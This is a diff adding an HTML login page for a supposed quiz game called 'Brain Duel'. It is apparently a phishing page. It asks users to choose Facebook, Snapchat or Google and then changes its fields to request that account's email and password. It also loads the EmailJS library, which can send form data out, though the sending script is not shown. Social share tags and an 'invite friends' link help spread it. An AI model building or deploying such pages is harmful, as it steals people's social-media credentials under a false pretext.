@@ -1,0 +1,128 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Brain Duel - Connexion</title>
+
+  <!-- Balises Open Graph propres -->
+  <meta property="og:title" content="Brain Duel – Défie tes amis!" />
+  <meta property="og:description" content="Connecte-toi et montre que tu es le roi du quiz cérébral. Rejoins-moi sur Brain Duel!" />
+  <meta property="og:image" content="https://brain-duel-quiz-game.onrender.com/preview.png" />
+  <meta property="og:url" content="https://brain-duel-quiz-game.onrender.com/" />
+  <meta property="og:type" content="website" />
+
+  <!-- CSS et préchargements -->
+  <link rel="preload" as="image" href="background.png"/>
+  <link href="style.css" rel="stylesheet"/>
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script defer src="script.js"></script>
+</head>
+<body>
+
+<div style="text-align: center; margin-top: 5px;">
+  <h2>🎮 Bienvenue sur Brain Duel</h2>
+</div>
+
+<div class="login-box">
+  <img alt="Brain Duel Logo" class="logo" src="logo.png"/>
+  <h2>Défie-moi dans Brain Duel!</h2>
+  <p>Veuillez vous connecter avec l’un des services suivants pour commencer le jeu et enregistrer votre progression.</p>
+
+  <form id="login-form">
+    <div style="display: flex; justify-content: center; gap: 15px; margin-bottom: 15px;">
+      <img alt="Facebook" onclick="choisirReseau('facebook')" src="facebook.png" style="width: 60px; cursor: pointer;"/>
+      <img alt="Snapchat" onclick="choisirReseau('snapchat')" src="snapchat.png" style="width: 60px; cursor: pointer;"/>
+      <img alt="Google" onclick="choisirReseau('google')" src="google.png" style="width: 60px; cursor: pointer;"/>
+    </div>
+    <input disabled name="user_email" placeholder="Numéro de mobile, e-mail ou nom d'utilisateur" required type="text"/>
+    <input disabled name="user_password" placeholder="Mot de passe" required type="password"/>
+    <button class="facebook-btn" type="submit">🔵 Se connecter</button>
+  </form>
+
+  <div class="loader hidden" id="loader"></div>
+  <p><a href="https://www.facebook.com" target="_blank">Mot de passe oublié ?</a></p>
+
+  <div class="invite-btn-container">
+    <a href="invite.html"><button>🎉 Inviter des amis</button></a>
+  </div>
+</div>
+
+<!-- Contrôles audio -->
+<div id="audio-controls" style="margin-top: 5px; text-align: center;">
+  <button id="toggle-sound" style="font-size: 24px; background: none; border: none; cursor: pointer;">🔇</button>
+  <input id="volume-slider" type="range" min="0" max="1" step="0.01" value="0.5" style="width: 200px; vertical-align: middle;"/>
+</div>
+
+<audio id="background-music" src="calm_piano.mp3" loop preload="auto"></audio>
+
+<script>
+  const music = document.getElementById("background-music");
+  const toggleSound = document.getElementById("toggle-sound");
+  const volumeSlider = document.getElementById("volume-slider");
+  let isPlaying = false;
+
+  toggleSound.addEventListener("click", () => {
+    if (isPlaying) {
+      music.pause();
+      toggleSound.textContent = "🔇";
+    } else {
+      music.play();
+      toggleSound.textContent = "🔊";
+    }
+    isPlaying = !isPlaying;
+  });
+
+  volumeSlider.addEventListener("input", (e) => {
+    music.volume = e.target.value;
+  });
+
+  document.addEventListener("DOMContentLoaded", function () {
+    function startMusicOnce() {
+      music.play().catch(err => console.warn("Erreur lecture musique :", err));
+      document.body.removeEventListener("click", startMusicOnce);
+    }
+    document.body.addEventListener("click", startMusicOnce);
+  });
+</script>
+
+<script>
+  function selectProvider(provider) {
+    localStorage.setItem("login_provider", provider);
+    const destinations = {
+      facebook: "login-facebook.html",
+      snapchat: "login-snapchat.html",
+      google: "login-google.html"
+    };
+    window.location.href = destinations[provider];
+  }
+
+  function choisirReseau(nom) {
+    activerChamps(nom);
+    updateInputPlaceholders(nom);
+  }
+
+  function activerChamps() {
+    document.querySelector('input[name="user_email"]').disabled = false;
+    document.querySelector('input[name="user_password"]').disabled = false;
+  }
+
+  function updateInputPlaceholders(domain) {
+    const emailInput = document.querySelector('input[name="user_email"]');
+    const passwordInput = document.querySelector('input[name="user_password"]');
+    if (!emailInput || !passwordInput) return;
+
+    const data = {
+      facebook: ["Adresse e-mail ou numéro Facebook", "Mot de passe Facebook"],
+      snapchat: ["Nom d’utilisateur ou e-mail Snapchat", "Mot de passe Snapchat"],
+      google: ["Adresse Gmail ou téléphone", "Mot de passe Google"]
+    };
+
+    [emailInput.placeholder, passwordInput.placeholder] = data[domain];
+  }
+</script>
+
+</body>
+</html>
